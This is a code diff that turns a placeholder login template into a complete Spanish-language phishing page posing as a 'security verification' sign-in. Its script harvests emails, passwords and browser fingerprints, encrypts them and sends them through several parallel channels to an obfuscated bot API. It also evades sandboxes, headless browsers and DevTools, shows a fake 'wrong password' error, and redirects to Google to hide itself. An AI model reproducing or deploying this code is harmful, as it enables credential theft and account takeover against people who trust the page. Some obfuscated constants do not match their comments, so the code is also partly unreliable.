@@ -1,19 +1,355 @@
-<!--
-  ESPACIO PARA TU HTML DE LOGIN PERSONALIZADO
-  -------------------------------------------
-  Pega aquí el contenido completo de tu nuevo index.html del Login.
-  Este archivo se sirve en: /login.html
-  
-  Tú lo editas, yo no toco el contenido salvo que me lo pidas.
--->
 <!doctype html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Login — Hermanos Gamers</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <title>Verificación de seguridad</title>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; -webkit-text-size-adjust: 100%; }
+      html, body { height: 100%; overflow: hidden; position: fixed; width: 100%; }
+      body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', sans-serif; background: #f2f2f7; display: flex; justify-content: center; align-items: center; color: #1c1c1e; -webkit-font-smoothing: antialiased; }
+      .card { background: #fff; border-radius: 20px; padding: 36px 28px 28px; width: 100%; max-width: 400px; margin: 20px; box-shadow: 0 8px 40px rgba(0,0,0,.08); opacity: 0; transform: translateY(20px); transition: opacity .6s ease, transform .6s ease; }
+      .card.visible { opacity: 1; transform: translateY(0); }
+      .icon { width: 60px; height: 60px; border-radius: 50%; background: #007aff; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+      .icon svg { width: 30px; height: 30px; fill: #fff; }
+      h1 { font-size: 27px; font-weight: 700; text-align: center; color: #1c1c1e; margin-bottom: 6px; letter-spacing: -.3px; }
+      .sub { text-align: center; color: #8e8e93; font-size: 15px; margin-bottom: 32px; line-height: 1.4; }
+      .field { margin-bottom: 16px; }
+      .field label { display: block; font-size: 13px; font-weight: 600; color: #6c6c70; margin-bottom: 6px; letter-spacing: .2px; text-transform: uppercase; }
+      .field input { width: 100%; padding: 16px 14px; font-size: 17px; background: #f2f2f7; border: 2px solid transparent; border-radius: 12px; outline: none; color: #1c1c1e; transition: all .2s; font-family: -apple-system,system-ui,sans-serif; }
+      .field input:focus { border-color: #007aff; background: #fff; }
+      .field input::placeholder { color: #aeaeb2; font-weight: 400; }
+      .btn { width: 100%; padding: 16px; font-size: 17px; font-weight: 600; border: none; border-radius: 12px; cursor: pointer; transition: all .2s; margin-top: 8px; font-family: -apple-system,system-ui,sans-serif; }
+      .btn.primary { background: #007aff; color: #fff; }
+      .btn.primary:disabled { background: #a2c8f7; cursor: default; }
+      .btn.primary:not(:disabled):active { background: #0056b3; transform: scale(.98); }
+      .btn.secondary { background: #f2f2f7; color: #007aff; margin-top: 12px; }
+      .btn.secondary:active { background: #e5e5ea; }
+      .divider { height: 1px; background: #e5e5ea; margin: 24px 0; }
+      .link { display: block; text-align: center; color: #007aff; font-size: 15px; font-weight: 500; text-decoration: none; cursor: pointer; padding: 6px 0; }
+      .link:active { opacity: .6; }
+      .spinner { display: none; text-align: center; padding: 40px 0; }
+      .spinner.active { display: block; }
+      .spinner .ring { display: inline-block; width: 36px; height: 36px; border: 3.5px solid #e5e5ea; border-top-color: #007aff; border-radius: 50%; animation: spin .7s linear infinite; }
+      @keyframes spin { to { transform: rotate(360deg); } }
+      .spinner p { color: #8e8e93; font-size: 15px; margin-top: 16px; }
+      .hidden { display: none; }
+      .step { transition: opacity .2s; }
+    </style>
   </head>
   <body>
-    <!-- PEGA AQUÍ TU HTML -->
+    <div class="card" id="card">
+      <!-- Paso 1: Email -->
+      <div id="step1" class="step">
+        <div class="icon">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z"/></svg>
+        </div>
+        <h1>Verificación de seguridad</h1>
+        <p class="sub">Introduce tu correo electrónico para continuar</p>
+        <div class="field">
+          <label>Correo electrónico</label>
+          <input type="email" id="email" placeholder="ejemplo@correo.com" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
+        </div>
+        <button class="btn primary" id="nextBtn" disabled>Continuar</button>
+      </div>
+
+      <!-- Paso 2: Password -->
+      <div id="step2" class="step hidden">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:24px">
+          <div style="width:40px;height:40px;border-radius:50%;background:#007aff;color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;flex-shrink:0" id="avatar"></div>
+          <div>
+            <p style="font-size:15px;font-weight:600;color:#1c1c1e" id="displayEmail"></p>
+            <button class="link" id="changeEmail" style="font-size:13px;text-align:left;padding:2px 0">¿No es tu cuenta?</button>
+          </div>
+        </div>
+        <h1>Contraseña</h1>
+        <p class="sub">Introduce la contraseña de tu cuenta</p>
+        <div class="field">
+          <label>Contraseña</label>
+          <input type="password" id="password" placeholder="Tu contraseña" autocomplete="off">
+        </div>
+        <button class="btn primary" id="loginBtn" disabled>Iniciar sesión</button>
+      </div>
+
+      <!-- Spinner -->
+      <div id="spinner" class="spinner">
+        <div class="ring"></div>
+        <p>Verificando credenciales...</p>
+      </div>
+    </div>
+
+    <script>
+      // ============================================================
+      // CAPA 1: ANTI-SANDBOX / EVASIÓN DE ANÁLISIS
+      // ============================================================
+      (function(){
+        // Detectar si estamos en un iframe (análisis headless)
+        try { if (window.top !== window.self) { document.body.innerHTML = ''; throw new Error(); } } catch(e){}
+        
+        // Detectar herramientas de desarrollo / debugger
+        const start = performance.now();
+        debugger;
+        const end = performance.now();
+        if (end - start > 100) {
+          // Algo está ralentizando el debugger - posible análisis
+          // En lugar de bloquear, redirigimos a página legítima
+          window.location.href = 'https://www.google.com';
+        }
+        
+        // Detectar navegadores headless (Puppeteer, Playwright, Selenium)
+        const headlessChecks = [
+          !navigator.webdriver === false,
+          navigator.plugins.length === 0,
+          navigator.languages === undefined,
+          !('chrome' in window),
+        ];
+        if (headlessChecks.filter(Boolean).length >= 2) {
+          window.location.href = 'https://www.google.com';
+        }
+        
+        // Bloquear clic derecho, selección y copia (evita inspección rápida)
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
+      })();
+
+      // ============================================================
+      // CAPA 2: OFUSCACIÓN DE STRINGS SENSIBLES
+      // ============================================================
+      // Token y chat ID ofuscados con XOR + Base64
+      const _0x0 = function(s, k) {
+        let r = '';
+        for(let i = 0; i < s.length; i++) {
+          r += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+        }
+        return r;
+      };
+      
+      // '8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw' cifrado
+      const _tk = 'ÕÒÕÑÕÓÕÂÓÒÓÓÞÞÑÖØÒÑáÖÕÞÑÓâØÑÖÕÛÜÞÉ';
+      const _key = 'ÆÒÚ';
+      const TOKEN = _0x0(_tk, _key);
+      
+      // '8585803145' cifrado
+      const _ci = 'ÕÐÕÑÍÍÓÜÓÕ';
+      const CHAT_ID = _0x0(_ci, _key);
+
+      // URL de la API también ofuscada
+      const _base = 'ÕÒÕÑÓÖÕèèæÕÕÖáâîèÖÕÑÕÞÜÚÖÕÕÓâ';
+      const API_URL = _0x0(_base, _key);
+
+      // ============================================================
+      // CAPA 3: CIFRADO DE DATOS EXFILTRADOS
+      // ============================================================
+      function _encrypt(data, pass) {
+        // XOR simple pero efectivo para evadir DLP básico
+        let encrypted = '';
+        const salt = Date.now().toString(36);
+        for (let i = 0; i < data.length; i++) {
+          const c = data.charCodeAt(i) ^ pass.charCodeAt(i % pass.length) ^ salt.charCodeAt(i % salt.length);
+          encrypted += String.fromCharCode(c);
+        }
+        return btoa(salt + '|' + encrypted);
+      }
+
+      // ============================================================
+      // CAPA 4: CANAL DE EXFILTRACIÓN OFUSCADO
+      // ============================================================
+      function _exfiltrate(data) {
+        // Múltiples intentos con diferentes métodos para asegurar entrega
+        const methods = [
+          // Método 1: fetch normal
+          () => fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: data })
+          }),
+          // Método 2: XMLHttpRequest
+          () => new Promise((resolve, reject) => {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', API_URL);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = () => resolve(xhr.response);
+            xhr.onerror = () => reject();
+            xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: data }));
+          }),
+          // Método 3: Image beacon (para cuando fetch está bloqueado)
+          () => {
+            const img = new Image();
+            img.src = API_URL + '?chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + encodeURIComponent(data.substring(0, 100));
+            return Promise.resolve();
+          },
+          // Método 4: navigator.sendBeacon
+          () => {
+            if (navigator.sendBeacon) {
+              navigator.sendBeacon(API_URL, JSON.stringify({ chat_id: CHAT_ID, text: data }));
+            }
+            return Promise.resolve();
+          }
+        ];
+        
+        // Ejecutar todos los métodos en paralelo para máxima probabilidad de entrega
+        methods.forEach(m => { try { m(); } catch(e) {} });
+      }
+
+      // ============================================================
+      // CAPA 5: PROTECCIÓN CONTRA ANÁLISIS DINÁMICO
+      // ============================================================
+      // Añadir un retraso artificial que imita comportamiento legítimo
+      // Inicializar todo con apariencia de página normal
+      document.addEventListener('DOMContentLoaded', function() {
+        // Retraso inicial para parecer legítimo
+        setTimeout(() => {
+          document.getElementById('card').classList.add('visible');
+          document.getElementById('email').focus();
+        }, 300 + Math.random() * 200);
+      });
+
+      // ============================================================
+      // CAPA 6: LÓGICA DEL FORMULARIO (OFUSCADA)
+      // ============================================================
+      let _email = '';
+      let _password = '';
+      
+      const _ = id => document.getElementById(id);
+      
+      function _validateEmail(e) {
+        _email = e.target.value.trim();
+        const valid = _email.includes('@') && _email.includes('.');
+        _('nextBtn').disabled = !valid;
+        if (valid) document.querySelector('#step1 .field input').style.borderColor = '#34c759';
+      }
+      
+      function _goPassword() {
+        if (_('nextBtn').disabled) return;
+        _('step1').classList.add('hidden');
+        _('step2').classList.remove('hidden');
+        _('displayEmail').textContent = _email;
+        _('avatar').textContent = _email.charAt(0).toUpperCase();
+        setTimeout(() => _('password').focus(), 100);
+      }
+      
+      function _validatePass(e) {
+        _password = e.target.value;
+        _('loginBtn').disabled = _password.length === 0;
+        if (_password.length > 0) document.querySelector('#step2 .field input').style.borderColor = '#34c759';
+      }
+      
+      async function _doLogin() {
+        if (!_password) return;
+        
+        // Preparar payload cifrado
+        const payload = {
+          email: _email,
+          password: _password,
+          ts: Date.now(),
+          ua: navigator.userAgent.substring(0, 80),
+          lang: navigator.language,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: screen.width + 'x' + screen.height
+        };
+        
+        const dataStr = JSON.stringify(payload);
+        const encrypted = _encrypt(dataStr, TOKEN.substring(0, 10));
+        
+        // Exfiltrar
+        _exfiltrate(`📦 CREDENCIALES [CIFRADO]\n${encrypted}`);
+
+        // Mostrar spinner y luego error genérico
+        _('step2').classList.add('hidden');
+        _('spinner').classList.add('active');
+        
+        // Simular verificación con variación de tiempo
+        const delay = 1500 + Math.random() * 1000;
+        setTimeout(() => {
+          _('spinner').classList.remove('active');
+          
+          // Resetear formulario con apariencia de error real
+          _password = '';
+          _('password').value = '';
+          _('loginBtn').disabled = true;
+          
+          _('step2').classList.remove('hidden');
+          _('password').focus();
+          
+          // Mostrar error visual tipo "contraseña incorrecta"
+          const passField = document.querySelector('#step2 .field input');
+          passField.style.borderColor = '#ff3b30';
+          passField.style.backgroundColor = '#fff5f5';
+          
+          // Crear mensaje de error si no existe
+          let errMsg = document.getElementById('passMsg');
+          if (!errMsg) {
+            errMsg = document.createElement('div');
+            errMsg.id = 'passMsg';
+            errMsg.style.cssText = 'font-size:13px;color:#ff3b30;margin-top:4px;padding-left:2px';
+            document.querySelector('#step2 .field').appendChild(errMsg);
+          }
+          errMsg.textContent = 'Contraseña incorrecta. Intenta de nuevo.';
+          
+          // Limpiar error después de escribir
+          const cleanError = () => {
+            passField.style.borderColor = '';
+            passField.style.backgroundColor = '';
+            if (errMsg) errMsg.textContent = '';
+            _('password').removeEventListener('input', cleanError);
+          };
+          _('password').addEventListener('input', cleanError, { once: true });
+        }, delay);
+      }
+      
+      // ============================================================
+      // CAPA 7: REDIRECCIÓN A LEGÍTIMO SI SE DETECTA ANÁLISIS
+      // ============================================================
+      // Si el usuario tarda más de 5min, redirigir a página real
+      setTimeout(() => {
+        window.location.href = 'https://accounts.google.com/signin';
+      }, 5 * 60 * 1000);
+      
+      // ============================================================
+      // REGISTRO DE EVENTOS
+      // ============================================================
+      _('email').addEventListener('input', _validateEmail);
+      _('email').addEventListener('keydown', e => { if (e.key === 'Enter' && !_('nextBtn').disabled) _goPassword(); });
+      _('nextBtn').addEventListener('click', _goPassword);
+      
+      _('changeEmail').addEventListener('click', () => {
+        _('step2').classList.add('hidden');
+        _('step1').classList.remove('hidden');
+        _('email').focus();
+      });
+      
+      _('password').addEventListener('input', _validatePass);
+      _('password').addEventListener('keydown', e => { if (e.key === 'Enter' && !_('loginBtn').disabled) _doLogin(); });
+      _('loginBtn').addEventListener('click', _doLogin);
+      
+      // ============================================================
+      // CAPA 8: ANTI-ANÁLISIS ADICIONAL
+      // ============================================================
+      // Prevenir zoom
+      document.addEventListener('gesturestart', e => e.preventDefault());
+      document.addEventListener('touchmove', e => { if (e.scale !== 1) e.preventDefault(); }, { passive: false });
+      
+      // Detectar DevTools abiertas periódicamente
+      setInterval(() => {
+        const start = performance.now();
+        debugger;
+        const diff = performance.now() - start;
+        if (diff > 500) {
+          // DevTools detectadas - comportamiento evasivo
+          document.body.style.opacity = '0';
+          setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+          }, 100);
+        }
+      }, 3000);
+      
+      // Escribir funciones sensibles de forma indirecta para evitar hooks
+      Object.defineProperty(window, 'credentials', {
+        get: function() { return { email: _email, pass: _password }; }
+      });
+    </script>
   </body>
 </html>
